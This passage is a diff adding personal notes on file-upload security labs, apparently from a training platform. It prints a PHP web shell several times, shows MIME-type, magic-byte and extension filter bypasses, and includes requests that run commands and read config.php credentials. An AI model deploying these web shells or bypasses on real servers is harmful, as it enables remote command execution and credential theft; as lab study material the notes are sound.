@@ -349,3 +349,112 @@ app.listen(8080, '0.0.0.0', () => {
 #+end_src
 
 : http://example.com/shell.php?cmd=whoami
+
+* exam machine
+THe application only accepts .jpeg,.png,.git files, i put a .php file with this payload ->
+#+begin_src php
+<?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+#+end_src
+
+Change the mime file type to image/png and the name of the file to cmd.phtml
+#+begin_src php
+GET /uploads/cmd.phtml?cmd=whoami HTTP/1.1
+Host: filemanager.hv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+#+end_src
+
+*response* ->
+#+begin_src php
+HTTP/1.1 200 OK
+Date: Tue, 30 Sep 2025 01:24:23 GMT
+Server: Apache/2.4.59 (Debian)
+Content-Length: 9
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+www-data
+#+end_src
+
+* basic unrestricted file upload
+This lab contains a Unrestricted File Upload vulnerability. The application has an image upload function, but the uploaded file content or type is not checked on the server.
+
+To complete the lab, upload a malicious PHP script and read the "config.php" file.
+
+What is the database password in the config.php file?
+
+*payload cmd.php* ->
+#+begin_src php
+<?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+#+end_src
+
+Works and the webshell is uploaded
+: https://current-radioactive-man.europe1.hackviser.space/uploads/cmd.php?cmd=ls
+
+
+Get the password of the config.php file ->
+: GET /uploads/cmd.php?cmd=cat%20..%2fconfig.php
+
+* MIME Type filter bypass
+This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the Mime-Type.
+
+To complete the lab, upload a malicious PHP script by changing the Mime-Type and read the "config.php" file.
+
+What is the database password in the config.php file?
+
+Just change the MIME type at Contet-Type 'inside' of the file ->
+#+begin_src php
+Content-Disposition: form-data; name="input_image"; filename="cmd.php"
+Content-Type: image/png
+
+GIF89a;
+<?php
+if(isset($_GET['cmd'])) {
+	system($_GET['cmd']);
+}
+?>
+#+end_src
+
+Get the password ->
+: GET /uploads/cmd.php?cmd=cat ../config.php
+
+* file signature filter bypass
+This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file signature (a.k.a magic bytes).
+
+To complete the lab, upload a malicious PHP script by manipulating the file signature and read the "config.php" file.
+
+What is the database password in the config.php file?
+
+*bypass* ->
+#+begin_src php
+GIF89a;
+<?php
+if(isset($_GET['cmd'])) {
+	system($_GET['cmd']);
+}
+?>
+#+end_src
+
+To bypass the filter, GIF89a is added to the beginning of the file, making it look like a GIF file. If the server checks for this signature, it might perceive the file as an image and allow the upload. This enables the attacker to upload malicious PHP code.
+
+* file extension filter bypass
+This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file extension blacklist. Many file extensions that are dangerous to upload are included in this blacklist.
+
+To complete the lab, find a file extension that is not on the blacklist and upload the malicious PHP file with that extension, then read the "config.php" file.
+
+What is the database password in the config.php file?
+
+* file extension improved filter bypass
+This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file extension blacklist. Almost all file extensions that are dangerous to upload are included in this blacklist.
+
+To complete the lab, find a file extension that is not on the blacklist and upload the malicious PHP file with that extension, then read the "config.php" file.
+
+What is the database password in the config.php file?
